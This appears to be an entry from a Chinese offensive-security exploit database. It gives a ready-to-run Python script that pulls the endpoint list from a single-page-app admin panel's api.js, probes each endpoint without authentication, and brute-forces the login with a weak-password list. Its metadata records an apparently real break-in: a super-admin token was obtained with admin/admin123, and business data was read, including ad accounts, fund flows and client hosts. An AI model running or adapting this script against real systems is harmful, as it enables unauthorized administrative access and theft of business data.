# SPA 后台突破 —— 从前端 api.js 提取全接口清单 + 定向弱口令（实测 admin/admin123 拿到超管）

- **code**: spa-后台突破-从前端-api.js-提取全接口清单-定向弱口令-实测-admin-admin123-拿到超管
- **kind**: script
- **category**: weak-password
- **component**: Node.js Express 管理后台
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 203.0.113.113:3000（千川数据管理平台，Express+React18）实测成功：/js/api.js 未鉴权可读（200/5815B），提取出 11 个接口；逐个探测发现除 /api/auth/login 外全部 401「未授权」；对 /api/auth/login 用 admin/admin123 **第 4 次尝试即返回 200 + HS256 JWT**（payload id=1=超级管理员，mustChangePassword:false）。持 token 实测 6 个端点全部 200 并返回真实业务数据（155 个投放账号 / 资金流水 / 10 台客户端主机清单）。
- **path**: pocs/spa-后台突破-从前端-api.js-提取全接口清单-定向弱口令-实测-admin-admin123-拿到超管/spa_api_pivot.py
- **tags**: spa,react,api提取,弱口令,未授权,后台突破
- **created_at**: 2026-10-15T21:18:10.014Z
- **found_by**: vuln-scan

## 描述

SPA/React 管理后台快速突破：从未鉴权可读的前端 API 封装文件提取全部接口清单 → 逐个未授权探测分类 → 对 login 端点做定向弱口令（本次 admin/admin123 即由此命中）

## 用法

```
python spa_api_pivot.py <base_url> [api_js_path]
例: python spa_api_pivot.py http://203.0.113.113:3000 /js/api.js

流程：
1) 抓首页/登录页的 <script src>，找 api.js / request.js / service.js 这类封装文件
2) 这些文件通常**未鉴权可读**，且含全部后端接口定义 → 等于免费拿到接口地图
3) 跑本脚本：提取接口 → 逐个未授权探测（标出哪些无需鉴权）→ 对 login 端点定向弱口令
4) 命中后用 Authorization: Bearer <token> 访问受保护端点，验证权限边界
需要替换: base_url、api_js_path（可先用正则从首页 script 标签里找）。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""前端 API 封装文件 → 全接口提取 → 逐个未授权探测 → 定向弱口令登录

核心思路（本次实战验证有效）：
  SPA / React 后台常把「全部后端接口定义」放在一个可匿名读取的 JS 文件里
  （本例: /js/api.js）。先拿这份"接口地图"，再按图索骥，比盲扫目录高效得多。

用法:
    python spa_api_pivot.py <base_url> [api_js_path]
    例: python spa_api_pivot.py http://TARGET:3000 /js/api.js
"""
import sys, re, json, socket, urllib.parse

def http(url, method='GET', body=None, token=None, timeout=12):
    u = urllib.parse.urlparse(url)
    host = u.hostname; port = u.port or (443 if u.scheme == 'https' else 80)
    path = u.path or '/'
    if u.query: path += '?' + u.query
    h = '%s %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nAccept: application/json\r\n' % (method, path, u.netloc)
    if token: h += 'Authorization: Bearer %s\r\n' % token
    if body is not None: h += 'Content-Type: application/json\r\nContent-Length: %d\r\n' % len(body)
    h += '\r\n'
    s = socket.create_connection((host, port), timeout=timeout); s.settimeout(timeout)
    s.sendall(h.encode() + (body.encode() if body else b''))
    d = b''
    while True:
        try: x = s.recv(65536)
        except: break
        if not x: break
        d += x
    s.close(); return d.decode('utf-8', 'ignore')

def main(base, apijs='/js/api.js'):
    # ① 抓接口地图
    raw = http(base + apijs)
    js = raw.split('\r\n\r\n', 1)[1] if '\r\n\r\n' in raw else raw
    eps = sorted(set(re.findall(r"""['"]([A-Z]+)['"]\s*,\s*['"]([^'"]+)['"]""", js)))
    eps += sorted(set(re.findall(r"""request\(\s*['"]([A-Z]+)['"]\s*,\s*['"]([^'"]+)['"]""", js)))
    eps = sorted(set(eps))
    print('=== 从 %s 提取到 %d 个接口 ===' % (apijs, len(eps)))
    for m, p in eps: print('  %-6s %s' % (m, p))

    # ② 逐个未授权探测
    print('\n=== 未授权探测 ===')
    protected, openeps = [], []
    for m, p in eps:
        pp = re.sub(r'[?&][^=]*=$', '', p)  # 去掉裸参数
        r = http(base + pp, method=m if m in ('GET', 'POST') else 'GET',
                 body='{}' if m == 'POST' else None)
        code = r.split('\r\n')[0]
        bk = r.split('\r\n\r\n', 1)[1][:120].replace('\n', ' ') if '\r\n\r\n' in r else ''
        print('  %-6s %-34s %-24s %s' % (m, pp, code[:24], bk[:90]))
        (openeps if '200' in code else protected).append((m, p))
    print('\n无需鉴权: %d 个 | 需鉴权: %d 个' % (len(openeps), len(protected)))

    # ③ 定向弱口令（只打 login 端点）
    logins = [p for m, p in eps if 'login' in p.lower()]
    if not logins:
        print('\n未发现 login 端点，跳过弱口令'); return
    PW = ['admin123', 'admin', '123456', 'admin888', 'password', 'admin@123', '123456789',
          'admin123456', 'root', 'Aa123456', 'qwe123456', 'adminadmin']
    print('\n=== 定向弱口令 (%s) ===' % logins[0])
    for pwd in PW:
        body = json.dumps({'username': 'admin', 'password': pwd})
        r = http(base + logins[0], 'POST', body)
        code = r.split('\r\n')[0]
        bk = r.split('\r\n\r\n', 1)[1][:150].replace('\n', ' ') if '\r\n\r\n' in r else ''
        hit = '200' in code and ('token' in bk or 'access' in bk)
        print('  admin/%-14s %-24s %s%s' % (pwd, code[:24], bk[:80], '  *** HIT ***' if hit else ''))
        if hit:
            print('\n★★★ 命中: admin / %s' % pwd)
            print('响应:', bk)
            return
    print('\n弱口令未命中')

if __name__ == '__main__':
    a = sys.argv[1:]
    main(a[0], a[1] if len(a) > 1 else '/js/api.js')
```
